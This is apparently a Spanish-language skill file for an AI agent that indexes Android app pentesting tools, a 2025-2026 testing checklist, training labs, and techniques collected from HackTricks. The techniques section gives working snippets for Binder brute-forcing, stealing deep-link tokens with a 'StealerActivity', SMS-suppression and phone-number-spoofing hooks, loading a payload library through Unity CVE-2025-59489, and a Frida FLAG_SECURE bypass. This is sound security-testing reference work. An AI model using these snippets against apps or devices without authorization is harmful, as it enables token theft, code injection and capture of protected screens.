---
name: hacktricks-reference
description: >
  Referencia consolidada de herramientas, tecnicas y cursos de HackTricks Wiki para Android pentesting. Cubre: nuevas herramientas (justapk, APKEditor, MalFixer, SSLPinDetect, Medusa, Auto-Frida, phantom-frida, frida-ui, frida-jdwp-loader, clsdumper, Deep-C, Jezail), checklist Android APK (estatico + dinamico 2025-2026), tecnicas avanzadas (AIDL/Binder exploitation, App Links hijacking, dual-signing v2/v3, DocumentProvider path traversal, FLAG_SECURE bypass, LSPosed SMS/telephony abuse, Unity RCE CVE-2025-59489, OEM telephony bypass), cursos de entrenamiento (8kSec Academy, Frida-Labs, OWASP UnCrackable, HackTricks ARTE/GRTE/AzRTE). Use como indice de recursos y para descubrir herramientas/tecnicas no cubiertas en los skills especializados.
---

# HackTricks Android Reference

Referencia consolidada del material recolectado de [HackTricks Wiki](https://hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/) durante Julio 2026. Este skill actua como indice de herramientas, tecnicas, cursos y recursos complementarios a los skills especializados (`android-reverse-engineering`, `frida-expert`, `apk-modding`).

---

## Nuevas Herramientas (no cubiertas en skills especializados)

| Herramienta | Proposito | URL |
|---|---|---|
| **justapk** | Descarga APK multi-source (APK20 → F-Droid → APKPure → APKMirror → Uptodown → APKCombo) | `pip install justapk` |
| **APKEditor** | Merge de split APKs (base + config splits) | https://github.com/REAndroid/APKEditor |
| **uber-apk-signer** | Firma APK simplificada (v1+v2+v3+v4) | `java -jar uber-apk-signer.jar -a merged.apk` |
| **MalFixer** | Reparar APKs malformados (ZIP metadata, manifest corrupto, asset names hostiles) | `python malfixer.py app.apk` |
| **SSLPinDetect** | Deteccion estatica de SSL pinning (Smali regex patterns) | https://github.com/aancw/SSLPinDetect |
| **Deep-C** | Automatizacion de deep link hunting (descompila APK, encuentra exported+browsable activities, genera PoCs) | https://github.com/KishorBal/deep-C |
| **Jezail** | Toolkit Android pentesting con REST API + Web UI (Flutter) | Instalar APK en dispositivo rooteado |
| **apkleaks** | Buscar secrets (API keys, passwords, URLs) en APKs | https://github.com/dwisiswant0/apkleaks |
| **mariana-trench** | Analisis estatico de codigo (fuentes → sinks → reglas) | https://github.com/facebook/mariana-trench |
| **fridump3** | Dump de memoria de proceso Android via Frida | `pip install fridump3` |
| **apk-mitm** | Parcheo automatico de SSL pinning (sin necesidad de root) | https://github.com/shroudedcode/apk-mitm |
| **pidcat** | Logcat coloreado y filtrado por paquete | https://github.com/JakeWharton/pidcat |
| **apkurlgrep** | Extraer URLs de APKs | https://github.com/ndelphit/apkurlgrep |

### Herramientas Frida avanzadas

| Herramienta | Proposito | URL |
|---|---|---|
| **Medusa** | Framework Frida con 90+ modulos (SSL, root, emulator, crypto, HTTP) | https://github.com/Ch0pin/medusa |
| **Auto-Frida** | Automatizacion Frida: deteccion de protecciones + generacion de script consolidado | https://github.com/ommirkute/Auto-Frida |
| **phantom-frida** | Frida server stealth (~90 parches anti-deteccion: nombres, ports, symbols, SELinux) | https://github.com/TheQmaks/phantom-frida |
| **frida-ui** | Interfaz web para Frida (listar dispositivos, spawn/attach, editor, CodeShare) | `pip install frida-ui` |
| **frida-jdwp-loader** | Inyeccion Frida sin root via JDWP (app debe ser debuggable) | https://github.com/frankheat/frida-jdwp-loader |
| **clsdumper** | Dump dinamico de DEX/clases con anti-Frida pre-stage (ART walk, memory scan, oat extract, FART) | `pip install clsdumper` |
| **r2frida** | Integracion radare2 + Frida | https://github.com/nowsecure/r2frida |
| **linjector** | Inyeccion de libreria sin ptrace | https://github.com/erfur/linjector-rs |

---

## Checklist Android APK Pentesting 2025-2026

### Estatico

- [ ] `android:exported` obligatorio en Android 12+ — componentes exportados sin proteccion adecuada
- [ ] `android:allowBackup`, `fullBackupContent`, `dataExtractionRules` — reglas de backup demasiado amplias
- [ ] `<queries>` block — expone apps externas con las que interactua (bancos, wallets, auth)
- [ ] `networkSecurityConfig` — `cleartextTrafficPermitted="true"` o domain-specific overrides
- [ ] WebView: `addJavascriptInterface`, `loadData*()`, `setJavaScriptEnabled(true)` → RCE/XSS potencial
- [ ] Deep Links / App Links: `android:autoVerify`, esquemas custom sin proteccion
- [ ] PendingIntent: `FLAG_MUTABLE` sin intent explicito → intent redirection
- [ ] FileProvider: paths expuestos (`root-path`, `external-path`)
- [ ] Content Providers: `readPermission`/`writePermission` ausentes, SQL injection via `query()`
- [ ] Firebase URLs mal configuradas → acceso no autorizado a bases de datos
- [ ] Hardcoded secrets: API keys, passwords, tokens en strings.xml, codigo, assets
- [ ] Native libs con CVEs conocidas (libwebp CVE-2023-4863, libpng, etc.)
- [ ] Unity Runtime: exported `UnityPlayerActivity`/`UnityPlayerGameActivity` con `unity` CLI extras → CVE-2025-59489
- [ ] SSLPinDetect: mapear donde se aplica SSL pinning estaticamente
- [ ] OEM Content Providers sin proteccion de permisos (OnePlus CVE-2025-10184)

### Dinamico

- [ ] Proxy + CA cert en dispositivo
- [ ] Bypass SSL pinning (Frida, Objection, apk-mitm, HTTP Toolkit)
- [ ] Bypass anti-instrumentacion (phantom-frida, Magisk DenyList)
- [ ] Bypass anti-root (Magisk + Zygisk + DenyList + Shamiko + TrickyStore)
- [ ] Bypass Play Integrity (PIF + TrickyStore + keybox valida)
- [ ] Explotar Activities exportadas via Drozer o ADB
- [ ] Explotar Content Providers (SQL injection, path traversal, lectura/escritura)
- [ ] Explotar Services/Broadcast Receivers exportados
- [ ] Deep links: intent hijacking, custom scheme handler, auth token interception
- [ ] Tapjacking / TapTrap (Android 15+ sin permiso de overlay)
- [ ] WebView: `javascript:` URL injection, intent scheme handlers
- [ ] Insecure data storage: SharedPreferences, SQLite DBs, internal/external storage
- [ ] AIDL/Binder services: `service list` → `service call` → brute-force transaction codes
- [ ] FLAG_SECURE bypass para capturar pantalla durante analisis
- [ ] Dump de memoria (fridump3) para buscar secrets en cleartext
- [ ] Logcat/pidcat: informacion sensible en logs de la app
- [ ] Clipboard: datos sensibles en portapapeles
- [ ] Biometric bypass: Frida hook de `BiometricPrompt`

---

## Tecnicas Avanzadas

### AIDL / Binder Service Exploitation

```bash
# Listar servicios Binder disponibles
adb shell service list

# "Ping" a un servicio (transaction code 1598968902 = 0x5f4e5446 = "_NTF")
service call mtkconnmetrics 1

# Brute-force transaction codes
for i in $(seq 1 50); do
    printf "[+] %2d -> " $i
    service call mtkconnmetrics $i 2>/dev/null | head -1
done

# Llamar con argumentos: service call <name> <code> [type value ...]
# Tipos: i32 <int>, i64 <long>, s16 <string>, utf16 <string>
```

### App Links / Deep Link Verification Testing

```bash
# Forzar verificacion de App Links
adb shell pm verify-app-links --re-verify com.target.app

# Estado actual de dominios verificados
adb shell pm get-app-links com.target.app

# Lanzar deep link via ADB
adb shell am start -a android.intent.action.VIEW -d "myscheme://host/path?param=value"
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW -d "myapp://host/web?url=javascript:alert(1)"
```

### Custom-Scheme Handler Hijacking (auth token interception)

Si un deep link transporta `code=<token>`, otra app puede registrar el mismo scheme y recibir el token completo:

```xml
<activity android:name=".StealerActivity" android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="myapp" />
  </intent-filter>
</activity>
```

### Dual-Signing v2/v3 APK Verifier Confusion

Si un verificador custom acepta v2 pero Android instala usando v3:
1. Construir payload con package name esperado
2. Firmar con v3 (attacker key) solamente
3. Transplantar v2 signing block de un APK confiable
4. El verificador custom acepta v2, Android instala con v3

### DocumentProvider Path Traversal

Auditar restore/import que usan `DocumentsContract.getDocumentId` sin `getCanonicalPath()` + `startsWith(<allowed_dir>)`:
```java
// VULNERABLE
File dstFile = new File(
    DocumentsContract.getDocumentId(srcUri)
        .replaceFirst(rootDocumentId, tempFolderPath)
);
// Encoded traversal: data%2F..%2Fpayload.apk → data/../payload.apk
```

### LSPosed/Xposed SMS Injection & Identity Spoofing

```java
// Suprimir envio SMS y capturar contenido
XposedHelpers.findAndHookMethod("android.telephony.SmsManager", lpparam.classLoader,
    "sendTextMessage", String.class, String.class, String.class, PendingIntent.class, PendingIntent.class,
    new XC_MethodHook() {
        protected void beforeHookedMethod(MethodHookParam param) {
            String body = (String) param.args[2];
            param.setResult(null); // suprimir envio real
        }
    }
);

// Spoofear numero de telefono
XposedHelpers.findAndHookMethod("android.telephony.TelephonyManager", lpparam.classLoader,
    "getLine1Number", new XC_MethodHook() {
        protected void afterHookedMethod(MethodHookParam param) {
            param.setResult(spoofedMsisdn);
        }
    }
);
```

### Weak Receiver Challenge-Response Brute-Force

Si un receiver usa `new Random(System.currentTimeMillis())` para generar un challenge y el proceso puede ser reiniciado via crash de otro componente exportado, el seed se vuelve predecible.

### Unity Runtime RCE (CVE-2025-59489)

```bash
# via ADB a UnityPlayerActivity exportada
adb shell am start -n com.unity.app/com.unity3d.player.UnityPlayerActivity \
  -e -xrsdk-pre-init-library /data/local/tmp/libpayload.so
```

---

## Cursos, Training y Laboratorios

| Recurso | Descripcion | URL |
|---|---|---|
| **8kSec Academy** | Mobile & AI Security (iOS/Android RE, ARM64 exploitation, Ghidra/LLDB, PAC/MTE/SELinux) | https://academy.8ksec.io/ |
| **HackTricks Training** | ARTE (AWS), GRTE (GCP), AzRTE (Azure), LHE (Linux) Red Team | https://hacktricks-training.com/courses/ |
| **Cyber Helmets** | Cybersecurity training con labs custom y certificaciones | https://cyberhelmets.com/courses/ |
| **Modern Security** | AI Security Certification (LLM, RAG, embeddings, threat modeling) | https://www.modernsecurity.io/courses/ai-security-certification |
| **Frida-Labs** | Ejercicios practicos de Frida para Android | https://github.com/DERE-ad2001/Frida-Labs |
| **OWASP UnCrackable** | Crackmes Android (L1 Java, L2 native, L3 native+obfuscation, L4 Flutter, L5 Kotlin) | https://github.com/OWASP/owasp-mstg |
| **Frida Android Examples** | Ejemplos de hooking Frida por 11x256 | https://github.com/11x256/frida-android-examples |
| **Android RE Playground** | Frida demo app (t0thkr1s) | https://github.com/t0thkr1s/frida-demo |
| **InsecureBankv2** | App bancaria vulnerable para practica | https://github.com/dineshshetty/Android-InsecureBankv2 |

---

## Frida: FLAG_SECURE Bypass

```javascript
// disable-flag-secure.js — permite screenshots/grabacion durante analisis
Java.perform(function () {
  var LayoutParams = Java.use("android.view.WindowManager$LayoutParams");
  var FLAG_SECURE = LayoutParams.FLAG_SECURE.value;
  var Window = Java.use("android.view.Window");
  var Activity = Java.use("android.app.Activity");

  function strip(value) {
    return value & (~FLAG_SECURE);
  }

  Window.setFlags.overload('int', 'int').implementation = function (flags, mask) {
    return this.setFlags.call(this, strip(flags), strip(mask));
  };
  Window.addFlags.implementation = function (flags) {
    return this.addFlags.call(this, strip(flags));
  };

  Activity.onResume.implementation = function () {
    this.onResume();
    var self = this;
    Java.scheduleOnMainThread(function () {
      try { self.getWindow().clearFlags(FLAG_SECURE); } catch (err) {}
    });
  };
});
```

---

## Skills relacionados

- **`android-reverse-engineering`** — Triaje, analisis estatico, SSL pinning bypass, root hiding, Play Integrity, Frida cookbook
- **`frida-expert`** — Cookbook Frida con scripts verificados de CodeShare + HTTP Toolkit
- **`apk-modding`** — Parcheo persistente smali/nativo, repackaging, firma
- **`flutter-reverse-engineering`** — Analisis profundo de Flutter/Dart
- **`ghidra-pyghidra`** — Ghidra + pyghidra para analisis nativo ARM64
- **`android-cleanup`** — Limpieza post-pentesting del dispositivo

---

## Changelog

- 2026-07-19 (v1): Creacion inicial. Consolidacion de herramientas (15+), checklist 2025-2026, tecnicas avanzadas (AIDL/Binder, App Links hijacking, dual-signing, DocumentProvider, LSPosed SMS, Unity RCE, weak receiver brute-force), cursos y laboratorios. Extraido de HackTricks Wiki.
